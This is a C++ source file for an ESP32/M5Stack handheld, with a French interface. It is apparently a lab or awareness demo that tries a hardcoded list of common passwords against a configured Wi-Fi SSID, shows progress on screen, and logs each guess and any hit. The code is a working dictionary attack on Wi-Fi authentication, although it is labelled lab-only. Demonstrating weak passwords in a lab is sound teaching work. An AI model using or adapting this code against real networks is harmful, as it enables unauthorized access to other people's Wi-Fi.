#include "modes.h"

#include <WiFi.h>

#include "config.h"

namespace {

const char* WORDLIST[] = {
    "password", "12345678", "azerty", "qwerty", "admin",
    "letmein", "welcome", "wifi1234", "00000000", "guest",
    "password1", "monmotdepasse", "starbucks", "free", "internet",
    "test", "demo", "hotel", "guest123", "changeme",
};

constexpr size_t WORDLIST_LEN = sizeof(WORDLIST) / sizeof(WORDLIST[0]);

size_t realIndex = 0;
bool realRunning = false;
bool realDone = false;
bool realFound = false;
String realPassword = "";
String realStatus = "Pret";
uint32_t realStartMs = 0;

void disconnectWifi() {
    WiFi.disconnect(true);
    delay(100);
}

bool tryPassword(const char* pwd) {
    WiFi.mode(WIFI_STA);
    WiFi.begin(LAB_SSID, pwd);

    uint32_t start = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - start < BRUTE_CONNECT_TIMEOUT_MS) {
        delay(50);
        M5.update();
    }

    bool ok = (WiFi.status() == WL_CONNECTED);
    disconnectWifi();
    return ok;
}

}  // namespace

void bruteRealInit() {
    realIndex = 0;
    realRunning = true;
    realDone = false;
    realFound = false;
    realPassword = "";
    realStatus = "Scan reseau labo...";
    realStartMs = millis();

    WiFi.mode(WIFI_STA);
    Serial.printf("[BRUTE_REAL] Cible: %s (labo uniquement)\n", LAB_SSID);
}

void bruteRealDraw() {
    auto& dsp = M5.Display;
    dsp.fillScreen(TFT_BLACK);
    drawHeader("Brute force (reel)");

    dsp.setTextColor(TFT_ORANGE);
    dsp.setTextSize(1);
    dsp.setCursor(4, 28);
    dsp.println("LABO UNIQUEMENT");

    dsp.setTextColor(TFT_WHITE);
    dsp.setCursor(4, 42);
    dsp.printf("SSID: %s", LAB_SSID);

    dsp.setCursor(4, 56);
    dsp.printf("Essai %u / %u", realIndex + 1, WORDLIST_LEN);

    int barW = 72;
    int fill = WORDLIST_LEN ? (int)((realIndex * barW) / WORDLIST_LEN) : 0;
    dsp.drawRect(4, 68, barW, 8, TFT_WHITE);
    dsp.fillRect(4, 68, fill, 8, TFT_RED);

    dsp.setCursor(4, 82);
    dsp.setTextColor(TFT_CYAN);
    if (realIndex < WORDLIST_LEN) {
        dsp.printf("> %s", WORDLIST[realIndex]);
    }

    dsp.setTextColor(TFT_DARKGREY);
    dsp.setCursor(4, 96);
    uint32_t elapsed = (millis() - realStartMs) / 1000;
    dsp.printf("T: %lus", elapsed);

    if (realDone && realFound) {
        dsp.setTextColor(TFT_RED);
        dsp.setCursor(4, 110);
        dsp.println("TROUVE !");
        dsp.setTextColor(TFT_YELLOW);
        dsp.setCursor(4, 122);
        dsp.printf("\"%s\"", realPassword.c_str());
    } else if (realDone) {
        dsp.setTextColor(TFT_GREEN);
        dsp.setCursor(4, 110);
        dsp.println("Non trouve (liste)");
        dsp.setCursor(4, 122);
        dsp.println("Mot de passe solide");
    }

    drawFooter(realRunning ? "A: pause  B: quitter" : "A: relancer");
}

void bruteRealLoop() {
    if (!realRunning || realDone) return;

    if (realIndex >= WORDLIST_LEN) {
        realDone = true;
        realRunning = false;
        realStatus = "Termine";
        bruteRealDraw();
        return;
    }

    const char* guess = WORDLIST[realIndex];
    realStatus = String("Test: ") + guess;
    Serial.printf("[BRUTE_REAL] Essai %u: %s\n", realIndex + 1, guess);

    if (tryPassword(guess)) {
        realFound = true;
        realPassword = guess;
        realDone = true;
        realRunning = false;
        Serial.printf("[BRUTE_REAL] SUCCES: %s\n", guess);
        bruteRealDraw();
        return;
    }

    realIndex++;
    bruteRealDraw();
    delay(BRUTE_DELAY_BETWEEN_MS);
}

void bruteRealTogglePause() {
    if (realDone) {
        bruteRealInit();
        bruteRealDraw();
        return;
    }
    realRunning = !realRunning;
    bruteRealDraw();
}

bool bruteRealIsDone() { return realDone; }
bool bruteRealWasFound() { return realFound; }
